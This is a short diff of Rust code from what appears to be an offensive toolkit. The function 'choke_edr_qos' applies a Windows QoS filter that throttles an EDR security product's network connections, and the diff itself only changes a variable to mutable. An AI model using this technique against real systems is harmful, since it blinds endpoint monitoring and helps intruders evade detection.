@@ -676,14 +676,14 @@ fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
     //    For simplicity, we set a global bandwidth cap on the QoS handle
     //    and let the operator refine the filter. The key property is that
     //    once set, pacer.sys throttles the process's TCP connections.
-    let config = QOS_FILTER_CONFIG { version: 1, num_fields: 0 };
+    let mut config = QOS_FILTER_CONFIG { version: 1, num_fields: 0 };
 
     // 3. Add the filter (applies to all flows on this handle).
     let _ = unsafe {
         add_filter(
             qos_handle,
             core::ptr::null(), // null AppId = apply to all
-            &config,
+            &mut config,
         )
     };
 
